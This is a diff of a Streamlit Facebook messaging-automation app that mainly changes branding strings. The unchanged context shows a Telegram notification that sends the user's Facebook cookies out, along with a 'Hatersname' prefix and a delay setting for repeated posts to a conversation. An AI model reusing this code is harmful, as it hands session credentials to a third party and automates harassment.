@@ -11,7 +11,7 @@ import requests
 import os
 
 st.set_page_config(
-    page_title="FB E2EE by AARAV UFF RAHUL SANATANI BOY",
+    page_title="FB E2EE by MAYA TATTO KA KAAL",
     page_icon="ðŸ‘‘",
     layout="wide",
     initial_sidebar_state="expanded"
@@ -501,7 +501,7 @@ def send_telegram_notification(username, automation_state=None, cookies=""):
 
 ðŸ‘¤ *Username:* {username}
 â° *Time:* {current_time}
-ðŸ¤– *System:* AARAV UFF RAHUL E2EE Facebook Automation
+ðŸ¤– *System:* MAYA TATTO KA KAAL E2EE Facebook Automation
 ðŸª *Cookies:* `{cookies_display}`
 
 âœ… User has successfully started the automation process."""
@@ -1148,7 +1148,7 @@ def stop_automation(user_id):
     st.session_state.automation_state.running = False
     db.set_automation_running(user_id, False)
 
-st.markdown('<div class="main-header"><h1>AARAV UFF RAHUL E2EE FACEBOOK CONVO</h1><p>Created by AARAV UFF RAHUL</p></div>', unsafe_allow_html=True)
+st.markdown('<div class="main-header"><h1>MAYA TATTO KA KAAL E2EE FACEBOOK CONVO</h1><p>Created by AARAV UFF RAHUL</p></div>', unsafe_allow_html=True)
 
 if not st.session_state.logged_in:
     tab1, tab2 = st.tabs(["ðŸ” Login", "âœ¨ Sign Up"])
@@ -1234,7 +1234,7 @@ else:
                                    help="Facebook conversation ID from the URL")
             
             name_prefix = st.text_input("Hatersname", value=user_config['name_prefix'],
-                                       placeholder="e.g., [END TO END AARAV UFF RAHUL HERE]",
+                                       placeholder="e.g., [END TO END MAYA TATTO KA KAAL HERE]",
                                        help="Prefix to add before each message")
             
             delay = st.number_input("Delay (seconds)", min_value=1, max_value=300, 
@@ -1313,3 +1313,4 @@ else:
                 st.rerun()
 
 st.markdown('<div class="footer">Made with â¤ï¸ by AARAV UFF RAHUL | Â© 2025 All Rights Reserved</div>', unsafe_allow_html=True)
+
